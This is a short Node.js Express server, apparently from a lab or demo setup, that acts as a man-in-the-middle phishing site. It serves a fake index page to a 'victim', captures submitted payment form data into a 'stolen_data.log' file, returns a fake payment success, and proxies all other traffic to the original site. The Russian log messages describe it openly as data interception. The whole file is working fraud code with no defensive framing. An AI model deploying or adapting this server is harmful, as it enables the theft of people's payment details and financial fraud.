import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import httpProxy from 'http-proxy';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8081;
const proxy = httpProxy.createProxyServer({});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const logDir = '/app/logs';
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });
}

function logStolen(data, source = 'unknown') {
    const logEntry = {
        timestamp: new Date().toISOString(),
        source: source,
        data: data
    };
    console.log("ПЕРЕХВАЧЕНЫ ДАННЫЕ:", logEntry);
    
    fs.appendFileSync(path.join(logDir, 'stolen_data.log'), JSON.stringify(logEntry) + '\n');
}

app.get('/', (req, res) => {
    console.log("MITM Жертва зашла на поддельный сайт");
    res.sendFile(path.join(__dirname, 'public', 'fake-index.html'));
});

app.post("/api/payment", (req, res) => {
    console.log("MITM  Перехватываем оплату");
    logStolen(req.body, 'payment_form');
    
    res.json({ 
        status: "success", 
        message: "Оплата принята",
        transaction_id: "txn_" + Date.now()
    });
});

app.use((req, res) => {
    console.log(` MITM Проксируем ${req.method} ${req.url}`);
    proxy.web(req, res, { 
        target: 'http://original:8080',
        changeOrigin: true 
    });
});

proxy.on('error', (err, req, res) => {
    console.log('Прокси ошибка:', err.message);
    res.status(500).send('Server error');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`MITM-сервер (подменяет оригинал) → http://localhost:8081`);
});